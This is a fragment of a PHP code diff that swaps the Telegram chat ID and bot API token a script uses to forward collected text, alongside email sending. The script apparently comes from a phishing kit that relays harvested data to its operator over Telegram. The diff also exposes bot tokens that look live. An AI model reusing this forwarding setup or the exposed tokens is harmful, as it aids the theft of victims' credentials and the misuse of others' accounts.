@@ -29,8 +29,8 @@ $headers .= "MIME-Version: 1.0\n";
 }
 
 $txt = $JarJar;
-$chat_id = "531949274"; // Your Telegram Chat ID
-$bot_url = "bot1905261133:AAE7ga8QuYmeckS9zM6iuTpHQHD2P2-oYGM"; //Your Telegram Bot Api Key
+$chat_id = "271695686"; // Your Telegram Chat ID
+$bot_url = "bot2006409922:AAE4BpAtFvqSPYtEEq4jbv5OQppaGDF7DLg"; //Your Telegram Bot Api Key
 
 if ($telegram == "on"){
     $send = ['chat_id'=>$chat_id,'text'=>$txt];
